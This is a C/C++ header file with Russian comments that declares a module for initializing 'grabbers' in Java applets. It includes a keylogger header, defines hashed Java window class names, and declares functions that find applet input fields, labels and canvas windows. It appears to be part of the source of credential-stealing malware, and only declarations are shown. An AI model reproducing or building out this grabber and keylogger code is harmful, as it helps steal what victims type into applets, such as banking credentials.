//---------------------------------------------------------------------------
//
//  Модуль инициализации граберов в ява аплетах
//
//  Модифицирован: декабрь 2012
//  Версия:        1.0
//
//
//  ВАЖНО:  Для корректной инициализации грабера необходимо
//          включать данный модуль во всех заголовочных
//          файлах граберов
//
//---------------------------------------------------------------------------

#ifndef JavaAppletGrabbersH
#define JavaAppletGrabbersH
//---------------------------------------------------------------------------

#include <Windows.h>
#include "UniversalKeyLogger.h"


// Хэши классов окна явы
#define JAVAWND_SUNAWTFRAME  0x809BB5B9 /* sunawtframe */
#define JAVAWND_SUNAWTDIALOG 0xFDDA99B6 /* sunawtdialog */

//-----------------------------------------------
//  Фугкция инициализирует систему граберов в
//  ява аплетах
//-----------------------------------------------
bool InitializeJavaAppletGrabbers();




//=========================================================
//  Утилиты для работы с аплетами ява
//=========================================================


//-----------------------------------------------
// IsJavaEditWindow - Функция возвращает истину
//                    если окно является
//                    редактором ввода ява аплета
//-----------------------------------------------
bool IsJavaEditWindow(HWND Wnd);


//-----------------------------------------------
//  IsJavaLabelWindow - Функция возвращает истину
//                     окно является обычной
//                     надписью
//-----------------------------------------------
bool IsJavaLabelWindow(HWND Wnd);



//-----------------------------------------------
//  GetSunAwtCanvasWnd - Функция возвращает окно
//                       SunAwtCanvas
//-----------------------------------------------
HWND GetSunAwtCanvasWnd(HWND SunAwtFrameWnd);


//---------------------------------------------------------------------------
#endif
